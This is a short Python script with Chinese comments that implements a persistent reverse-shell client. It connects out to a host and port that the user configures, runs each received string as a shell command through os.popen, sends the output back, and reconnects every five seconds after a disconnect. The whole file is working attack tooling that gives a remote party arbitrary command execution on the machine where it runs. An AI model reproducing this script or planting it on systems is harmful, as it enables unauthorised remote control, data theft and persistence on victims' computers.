import os
import socket
import time

HOST = '你自己服务器的ip或者域名' 
PORT = 7897

while True:
    # 创建 socket 对象
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            connected = True
        except ConnectionRefusedError:
            connected = False
            print("连接拒绝，无法连接到服务器。")

        while connected:
            try:
                # 接收数据
                data = s.recv(1024).decode()
                print("接收到的数据：", data)

                if not data:
                    # 数据为空，表示连接断开
                    connected = False
                    break
                
                result = os.popen(data).read()
                print("执行结果：", result)
                message = result
                if message:
                    # 发送字符串给服务器
                    s.sendall(message.encode())
                    
                else:
                    ret = '返回值为空'
                    s.sendall(ret.encode())
                    
            except ConnectionResetError:
                print("连接重置，连接已断开。")
                connected = False
                break

        if not connected:
            print("连接断开，重新尝试连接...")
            time.sleep(5)  # 延迟5秒后进行下一次连接尝试

print("客户端运行结束。")
